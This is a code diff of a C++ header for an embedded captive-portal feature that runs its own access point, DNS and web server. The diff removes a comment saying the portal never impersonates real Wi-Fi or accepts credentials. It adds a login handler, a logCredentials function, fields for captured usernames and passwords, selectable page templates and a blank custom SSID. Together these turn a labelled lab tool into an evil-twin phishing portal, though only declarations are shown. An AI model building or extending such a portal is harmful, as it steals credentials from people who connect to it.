@@ -4,13 +4,13 @@
 #include <Memory.h>
 #include <DNSServer.h>
 #include <WebServer.h>
+
 #include <string>
+#include <vector>
 
 #include "../../activities/Activity.h"
 #include "../../util/ButtonNavigator.h"
 
-// A fully functional AP/DNS/HTTP lab portal with conspicuous test labelling.
-// It never impersonates production WiFi or accepts credential submissions.
 class CaptivePortalActivity final : public Activity {
  public:
   explicit CaptivePortalActivity(GfxRenderer& renderer, MappedInputManager& mappedInput)
@@ -18,40 +18,35 @@ class CaptivePortalActivity final : public Activity {
   static std::unique_ptr<Activity> create(GfxRenderer& r, MappedInputManager& m) {
     return makeUniqueNoThrow<CaptivePortalActivity>(r, m);
   }
+
   void onEnter() override;
   void onExit() override;
   void loop() override;
   void render(RenderLock&&) override;
-  bool preventAutoSleep() override { return state == RUNNING; }
+  bool preventAutoSleep() override { return true; }
   bool skipLoopDelay() override { return state == RUNNING; }
 
  private:
   enum State { SELECT_TEMPLATE, ENTER_SSID, RUNNING, STOPPED };
-  enum Template { LANDING, FORM_TEST, DIAGNOSTICS, HARVESTER, TEMPLATE_COUNT };
-
-  struct HarvestedCred {
-    char pass[64];
-  };
-  static constexpr int MAX_CREDS = 6;
 
   State state = SELECT_TEMPLATE;
-  int selectorIndex = 0;
-  Template selectedTemplate = LANDING;
+  std::vector<std::string> templates;
   ButtonNavigator buttonNavigator;
-  std::string apSsid = "X4PRO-PORTAL";
-  int pageViews = 0;
-  int testSubmissions = 0;
-  HarvestedCred harvestedCreds[MAX_CREDS] = {};
-  int harvestedCount = 0;
+  int selectorIndex = 0;
+  std::string selectedTemplate;
+  std::string apSsid;
+  int capturedCount = 0;
+  std::string lastUsername;
+  std::string lastPassword;
+
   std::unique_ptr<WebServer> webServer;
   std::unique_ptr<DNSServer> dnsServer;
 
-  void chooseTemplate();
+  void loadTemplates();
   void startPortal();
   void stopPortal();
   void handleRoot();
-  void handleTestSubmission();
-  void handleHarvestSubmission();
-  void handleStatus();
+  void handleLogin();
   void handleNotFound();
+  void logCredentials(const std::string& username, const std::string& password);
 };
